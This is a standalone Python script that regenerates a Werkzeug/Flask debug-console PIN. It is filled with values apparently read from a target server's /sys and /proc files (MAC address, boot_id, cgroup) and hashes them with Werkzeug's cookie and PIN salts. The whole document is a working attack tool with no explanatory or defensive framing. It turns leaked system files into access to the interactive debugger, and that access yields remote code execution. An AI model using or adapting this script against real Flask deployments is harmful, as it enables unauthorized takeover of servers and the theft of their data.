import hashlib
from itertools import chain
probably_public_bits = [
    'nobody',  # username
    'flask.app',  # usually flask.app
    'Flask',  # usually Flask
    '/usr/local/lib/python3.11/site-packages/flask/app.py'
]

private_bits = [
    '2485378220034',  # /sys/class/net/eth0/address, in decimal
    'c8f9da87-a91a-4c4a-8471-84de92bce74c5ac4821f05be3bf6fc15be650f87babc56363b1c9a70e7b8f781b37f6ea2a0fa'  # /proc/sys/kernel/random/boot_id + /proc/self/cgroup (first line, post last slash (/))
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)